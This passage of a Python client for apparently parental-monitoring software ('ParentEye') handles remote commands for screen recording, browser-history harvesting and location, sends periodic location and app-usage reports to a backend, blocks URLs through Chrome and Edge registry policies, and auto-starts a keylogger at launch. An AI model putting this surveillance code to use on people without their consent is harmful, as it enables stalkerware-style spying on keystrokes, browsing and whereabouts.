                print(f" Recording completed ({len(video_b64)} bytes base64)")
                send_result(command_id, {
                    "type": "record",
                    "video_base64": video_b64,
                    "mime_type": "video/mp4",
                    "duration": duration
                })
                print(" Recording result sent to backend")
            except Exception as e:
                print(f" Recording failed: {e}")
                send_result(command_id, {"type": "record", "success": False, "message": str(e)})
        
        elif command_type == "chromehistory":
            try:
                print(" Fetching browser history (Chrome, Edge, Firefox)...")
                history_list = get_all_browser_history()
                
                # Send to backend (NEW)
                send_browser_history_to_backend(history_list)
                
                # Also send as result (for backward compatibility)
                send_result(command_id, {"type": "chromehistory", "data": history_list})
            except Exception as e:
                send_result(command_id, {"type": "chromehistory", "success": False, "message": str(e)})
        
        elif command_type == "get_location":
            print(" Location command received")
            location = get_location()
            
            # Send to backend via new endpoint (PRIMARY)
            send_location_to_backend(location)
            
            # Also send as result (for backward compatibility)
            send_result(command_id, location)
        
        elif command_type == "popup_alert":
            """Display popup alert on client"""
            print("\n" + "="*60)
            print("[POPUP ALERT COMMAND RECEIVED]")
            print("="*60)
            
            title = params.get('title', 'Alert!')
            message = params.get('message', 'Important message')
            priority = params.get('priority', 'normal')
            voice = params.get('voice', False)
            duration = params.get('duration', 5)
            
            print(f"Title: {title}")
            print(f"Message: {message}")
            print(f"Voice: {voice}")
            print(f"Priority: {priority}")
            print(f"Duration: {duration}s")
            print("="*60)
            
            try:
                import ctypes
                import subprocess
                import threading
                
                # STEP 1: Bring window to foreground
                print("[STEP 1] Bringing window to foreground...")
                try:
                    # Wake up the system
                    os.system('tasklist > nul')
                    print("   System activated")
                except Exception as e:
                    print(f"  ! Could not activate: {e}")
                
                # STEP 2: Display the message box
                print("[STEP 2] Displaying message box...")
                try:
                    # Try to use MB_TOPMOST flag (value 0x40000) to keep on top
                    MB_TOPMOST = 0x40000
                    MB_SYSTEMMODAL = 0x00001000
                    flags = MB_TOPMOST | MB_SYSTEMMODAL
                    
                    result = ctypes.windll.user32.MessageBoxW(0, message, title, flags)
                    print(f"   MessageBox displayed (result: {result})")
                except Exception as mb_err:
                    print(f"   MessageBox failed: {mb_err}")
                    # Try alternate method
                    try:
                        result = ctypes.windll.user32.MessageBoxW(0, message, title, 0)
                        print(f"   MessageBox displayed (alternate method, result: {result})")
                    except Exception as alt_err:
                        print(f"   Alternate MessageBox also failed: {alt_err}")
                        raise
                
                # STEP 3: Speak message if voice enabled
                if voice:
                    print("[STEP 3] Speaking message via TTS...")
                    
                    # Use threading to avoid blocking
                    def speak_message():
                        try:
                            print("  - Attempting pyttsx3...")
                            import pyttsx3
                            engine = pyttsx3.init()
                            engine.setProperty('rate', 150)
                            engine.say(message)
                            engine.runAndWait()
                            print("   Message spoken via pyttsx3")
                        except ImportError:
                            print("  ! pyttsx3 not available, using fallback...")
                            try:
                                # Escape message for PowerShell
                                safe_message = message.replace('"', '\\"').replace("'", "''")
                                ps_command = f'Add-Type -AssemblyName System.speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{safe_message}")'
                                result = subprocess.run(
                                    ['powershell', '-Command', ps_command],
                                    check=False,
                                    timeout=30,
                                    capture_output=True
                                )
                                print(f"   Message spoken via SAPI (exit code: {result.returncode})")
                            except Exception as sapi_err:
                                print(f"   SAPI fallback failed: {sapi_err}")
                        except Exception as tts_err:
                            print(f"   TTS error: {tts_err}")
                    
                    # Start TTS in background thread so it doesn't block
                    tts_thread = threading.Thread(target=speak_message, daemon=True)
                    tts_thread.start()
                else:
                    print("[STEP 3] Voice disabled, skipping TTS")
                
                # STEP 4: Send result
                print("[STEP 4] Sending result to backend...")
                send_result(command_id, {
                    "type": "popup_alert",
                    "success": True,
                    "message": f"Alert displayed: {title}",
                    "voice_enabled": voice
                })
                print("   Result sent successfully")
                print("="*60 + "\n")
                
            except Exception as e:
                print(f" ERROR DISPLAYING ALERT: {e}")
                import traceback
                traceback.print_exc()
                print("="*60 + "\n")
                try:
                    send_result(command_id, {
                        "type": "popup_alert",
                        "success": False,
                        "message": str(e)
                    })
                except:
                    pass
        
        else:
            print(f"Unknown command: {command_type}")
        
        # Mark command as executed
        requests.post(f"{BACKEND_URL}/api/command/executed/{command_id}", timeout=5)
        print(f" Command marked as executed")
        
    except Exception as e:
        print(f" Error executing command: {e}")
        import traceback
        traceback.print_exc()

# ==================== MAIN LOOP ====================

def sync_loop():
    """Continuously sync with backend"""
    while True:
        try:
            check_pending_commands()
            time.sleep(5)  # Check every 5 seconds
        except Exception as e:
            print(f"Sync error: {e}")
            time.sleep(10)

def send_periodic_location():
    """Send location to backend every 5 minutes"""
    while keylogger_running:
        try:
            location = get_location()
            send_location_to_backend(location)
            print(f" Location ping sent to backend")
            time.sleep(300)  # Every 5 minutes
        except Exception as e:
            print(f"Location update error: {e}")
            time.sleep(60)

def send_periodic_app_usage():
    """Send app usage to backend periodically"""
    sample_interval = 10
    flush_interval = 600
    elapsed = 0
    while keylogger_running:
        try:
            app_title = _get_active_app_title()
            if app_title:
                with app_usage_lock:
                    entry = app_usage_buffer.get(app_title, {"duration": 0})
                    entry["duration"] += sample_interval
                    app_usage_buffer[app_title] = entry
            time.sleep(sample_interval)
            elapsed += sample_interval
            if elapsed >= flush_interval:
                with app_usage_lock:
                    usage_payload = [
                        {"app_name": name, "duration": data["duration"]}
                        for name, data in app_usage_buffer.items()
                        if data.get("duration", 0) > 0
                    ]
                    app_usage_buffer.clear()
                if usage_payload:
                    send_app_usage_to_backend(usage_payload)
                elapsed = 0
        except Exception as e:
            print(f"App usage tracking error: {e}")
            time.sleep(60)

# ==================== WEBSITE BLOCKING ====================

def normalize_blocked_urls(urls):
    """Normalize URLs to block all variations (http, https, www, subdomains)"""
    normalized = []
    
    for url in urls:
        # Remove protocol if present
        url = url.replace('http://', '').replace('https://', '')
        # Remove trailing slash
        url = url.rstrip('/')
        
        # Don't modify if already has wildcard
        if url.startswith('*.'):
            normalized.append(url)
        else:
            # Add original domain
            normalized.append(url)
            # Add wildcard for all subdomains if not already www
            if not url.startswith('www.'):
                normalized.append(f"*.{url}")
                normalized.append(f"www.{url}")
            else:
                # If starts with www, also add version without www and with wildcard
                domain_without_www = url.replace('www.', '', 1)
                normalized.append(domain_without_www)
                normalized.append(f"*.{domain_without_www}")
            
            # Add common protocol patterns
            normalized.append(f"{url}/*")
    
    # Remove duplicates while preserving order
    seen = set()
    result = []
    for item in normalized:
        if item not in seen:
            seen.add(item)
            result.append(item)
    
    return result

def apply_chrome_blocking(urls):
    """Apply URL blocking to Chrome via Windows Registry (user-level, no admin needed)"""
    try:
        # Normalize URLs to block all variations
        normalized_urls = normalize_blocked_urls(urls) if urls else []
        
        # Open/Create Chrome Policies key in HKEY_CURRENT_USER (no admin required)
        key_path = r"Software\Policies\Google\Chrome\URLBlocklist"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
        except FileNotFoundError:
            # Create the key if it doesn't exist
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
        
        # Clear existing entries
        try:
            i = 0
            while True:
                winreg.DeleteValue(key, str(i))
                i += 1
        except FileNotFoundError:
            pass  # No more values to delete
        
        # Add new blocked URLs
        for idx, url in enumerate(normalized_urls):
            winreg.SetValueEx(key, str(idx), 0, winreg.REG_SZ, url)
        
        winreg.CloseKey(key)
        print(f" Chrome blocking applied: {len(urls)} websites ({len(normalized_urls)} patterns)")
        if normalized_urls:
            print(f"   Patterns: {', '.join(normalized_urls[:5])}{'...' if len(normalized_urls) > 5 else ''}")
        return True
    except Exception as e:
        print(f" Chrome blocking failed: {e}")
        return False

def apply_edge_blocking(urls):
    """Apply URL blocking to Edge via Windows Registry (user-level, no admin needed)"""
    try:
        # Normalize URLs to block all variations
        normalized_urls = normalize_blocked_urls(urls) if urls else []
        
        # Open/Create Edge Policies key in HKEY_CURRENT_USER (no admin required)
        key_path = r"Software\Policies\Microsoft\Edge\URLBlocklist"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
        except FileNotFoundError:
            # Create the key if it doesn't exist
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
        
        # Clear existing entries
        try:
            i = 0
            while True:
                winreg.DeleteValue(key, str(i))
                i += 1
        except FileNotFoundError:
            pass  # No more values to delete
        
        # Add new blocked URLs
        for idx, url in enumerate(normalized_urls):
            winreg.SetValueEx(key, str(idx), 0, winreg.REG_SZ, url)
        
        winreg.CloseKey(key)
        print(f" Edge blocking applied: {len(urls)} websites ({len(normalized_urls)} patterns)")
        if normalized_urls:
            print(f"   Patterns: {', '.join(normalized_urls[:5])}{'...' if len(normalized_urls) > 5 else ''}")
        return True
    except Exception as e:
        print(f" Edge blocking failed: {e}")
        return False

def fetch_and_apply_blocked_websites():
    """Fetch blocked websites from backend and apply to browsers"""
    try:
        print(f"\n{'='*60}")
        print(f"FETCHING BLOCKED WEBSITES FROM BACKEND")
        
        response = requests.get(f"{BACKEND_URL}/api/device/{DEVICE_ID}/blocked-websites", timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            urls = data.get("urls", [])
            
            print(f"Received {len(urls)} websites to block")
            if urls:
                print(f"   URLs: {', '.join(urls)}")
            
            if urls:
                print(f"\n Applying website blocking...")
                # Apply to both Chrome and Edge
                chrome_ok = apply_chrome_blocking(urls)
                edge_ok = apply_edge_blocking(urls)
                
                if chrome_ok or edge_ok:
                    print(f"\n{'='*60}")
                    print(f" BLOCKING APPLIED SUCCESSFULLY!")
                    print(f"{'='*60}")
                    print(f"️ IMPORTANT: You must RESTART your browser for changes to take effect!")
                    print(f"   1. Close ALL browser windows")
                    print(f"   2. End browser processes in Task Manager (if needed)")
                    print(f"   3. Restart browser and try visiting blocked sites")
                    print(f"{'='*60}\n")
            else:
                # No websites to block, clear existing blocks
                apply_chrome_blocking([])
                apply_edge_blocking([])
                print(" No websites blocked - all policies cleared")
        else:
            print(f" Failed to fetch blocked websites: HTTP {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f" Network error syncing blocked websites: {e}")
    except Exception as e:
        print(f" Error syncing blocked websites: {e}")

def sync_blocked_websites_loop():
    """Periodically sync blocked websites every 5 minutes"""
    while True:
        try:
            fetch_and_apply_blocked_websites()
            time.sleep(300)  # Check every 5 minutes
        except Exception as e:
            print(f"Blocked websites sync error: {e}")
            time.sleep(300)

def main():
    """Main function"""
    global keylogger_running
    
    print(f"\n{'='*60}")
    print(f"PARENTEYE CLIENT STARTED")
    print(f"{'='*60}")
    print(f"Device ID: {DEVICE_ID}")
    print(f"Backend Server: {BACKEND_URL}")
    print(f"MongoDB: {MONGO_URI}")
    print(f"{'='*60}")
    
    # Check admin privileges
    admin_status = is_admin()
    print(f"\nAdmin Status: {'YES (Full permissions)' if admin_status else 'NO (Limited permissions)'}")
    if not admin_status:
        print(f"   Note: Some features disabled without admin privileges")
        print(f"   - Website blocking/unblocking (hosts file modification)")
        print(f"   - Process termination (app blocking)")
        print(f"   - System control commands (lock, shutdown, restart)")
        print(f"   To enable: Right-click client.py Run as Administrator")
    print(f"\n{'='*60}\n")
    
    # Register device
    if not register_device():
        print("Failed to register device. Retrying in 10 seconds...")
        time.sleep(10)
        return

    # Request claim code for parent self-assign
    request_claim_code()
    
    # Auto-start keylogger when device connects
    print("Auto-starting keystroke monitoring...")
    start_keylogger()
    
    # Start location update thread (every 5 minutes) - SENDS TO BACKEND
    location_thread = threading.Thread(target=send_periodic_location, daemon=True)
    location_thread.start()
    
    # Start app usage tracking thread (every 10 minutes)
    app_usage_thread = threading.Thread(target=send_periodic_app_usage, daemon=True)
    app_usage_thread.start()

    # Start browser usage tracking thread
    browser_usage_thread = threading.Thread(target=track_browser_usage, daemon=True)
    browser_usage_thread.start()
    
    # Start website blocking sync thread
    blocking_thread = threading.Thread(target=sync_blocked_websites_loop, daemon=True)
    blocking_thread.start()
    
    # Initial sync of blocked websites
    fetch_and_apply_blocked_websites()
    
    # Start sync thread
    sync_thread = threading.Thread(target=sync_loop, daemon=True)
    sync_thread.start()
    
    # Keep the script running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down client...")
        keylogger_running = False
        stop_keylogger()

if __name__ == "__main__":
    main()
